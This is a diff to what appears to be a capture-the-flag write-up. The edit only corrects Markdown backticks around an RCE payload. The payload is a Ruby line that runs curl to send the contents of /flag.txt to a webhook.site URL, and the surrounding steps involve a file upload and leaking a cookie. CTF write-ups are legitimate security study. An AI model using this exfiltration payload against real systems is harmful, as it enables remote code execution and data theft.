@@ -1116,7 +1116,7 @@ Well, it seems like another dead end. But now I’ll show the exploit for the se
 
 - First, we’ll upload a file called ``load_command.rb`` to the ``/settings`` endpoint. Along with this, we proceed to leak the contents of the ``Legacy`` cookie using rotate chains. Make sure the ``load_command.rb`` file has your RCE payload, something like this:  
 
-``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)``
+``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)` ``
 
 
 - Then we'll send move on to the second part wherein we'll send the output of the following script as ``user_string``
